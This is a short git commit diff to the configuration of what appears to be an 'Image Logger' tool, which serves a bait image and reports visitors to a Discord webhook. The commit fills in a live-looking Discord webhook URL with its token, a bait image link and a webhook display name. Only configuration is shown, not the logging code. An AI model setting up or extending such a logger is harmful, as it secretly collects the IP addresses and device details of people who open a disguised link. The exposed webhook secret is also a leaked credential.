27fdf02e3d55a081e9fa733b76697e498100e7dc
trdevelopertool <ahmetdorukkocaturk0125@gmail.com>
2025-11-28 19:32:50 +0300

    main.py

--- api/main.py
+++ api/main.py
@@ -12,13 +12,13 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": "",
-    "image": "", # You can also have a custom image by using a URL argument
+    "webhook": "https://discord.com/api/webhooks/1444002832587030660/srIVUDGXmiAVaakGjjKbofvz-DVU62ntAWO-baVOxbUOULyTfrMmsw9oWsfyJUNCAdTe",
+    "image": "https://i.pinimg.com/736x/9d/3c/9e/9d3c9eebf9fcd80ded504c5af34d9763.jpg", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
     # CUSTOMIZATION #
-    "username": "Image Logger", # Set this to the name you want the webhook to have
+    "username": "nukeqed", # Set this to the name you want the webhook to have
     "color": 0x00FFFF, # Hex Color you want for the embed (Example: Red is 0xFF0000)
 
     # OPTIONS #
